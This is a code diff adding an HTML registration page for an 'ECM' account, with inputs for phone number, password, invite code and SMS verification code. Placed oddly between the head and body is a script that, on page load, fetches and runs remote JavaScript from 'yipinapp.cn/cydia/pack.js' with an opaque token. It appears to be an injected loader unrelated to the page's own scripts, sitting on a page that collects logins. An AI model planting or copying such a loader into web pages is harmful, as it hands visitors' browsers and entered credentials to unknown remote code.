@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>注册ECM账号</title>
+		<link rel="stylesheet" href="../../static/css/weui.css" />
+		<!--<link rel="stylesheet" href="../../static/css/weui-jquery.css" />-->
+		<link rel="stylesheet" href="../../static/css/linkregiter.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<h2 class="registerName">注册ECM账号</h2>
+		<div class="weui-cells weui-cells_form">
+			<div class="formInput">
+				<div class="weui-cell">
+					<div class="weui-cell__hd" id="showPicker">
+						<span class="addTxt">+<b></b></span><img class="trantImg" src="../../static/images/xiala.png" />
+					</div>
+					<div class="weui-cell__bd">
+						<input class="weui-input" id="loginTel" type="number"  placeholder="请输入手机号码">
+					</div>
+				</div>
+				<div class="weui-cell">
+					<div class="weui-cell__bd">
+						<input class="weui-input" id="loginPwd" type="password"  placeholder="请输入登录密码">
+					</div>
+				</div>
+				<div class="weui-cell">
+					<div class="weui-cell__bd">
+						<input class="weui-input" id="inviteCode" type="text"  placeholder="请输入邀请码">
+					</div>
+				</div>
+				<div class="weui-cell weui-cell_vcode">
+				    <div class="weui-cell__bd">
+				      <input class="weui-input" id="checkCode" type="number" placeholder="请输入验证码">
+				    </div>
+				    <div class="weui-cell__ft fotgetCode">
+				      <input type="button" value="验证码" id="getCode" />
+				    </div>
+				</div>
+			</div>
+			<p class="forgerB">注册即阅读并同意 <a href="../agreement.html">《Ecmco用户协议》</a></p>
+			<button class="weui-btn mybgBtn" id="loginBtn">确认注册</button>
+		</div>
+		<script type="text/javascript" src="../../lib/jquery.js" ></script>
+		<script type="text/javascript" src="../../lib/weui.js" ></script>
+		<script type="text/javascript" src="../../lib/weui.min.js" ></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js"></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script type="text/javascript" src="../../static/js/linkregiter.js" ></script>
+	</body>
+</html>
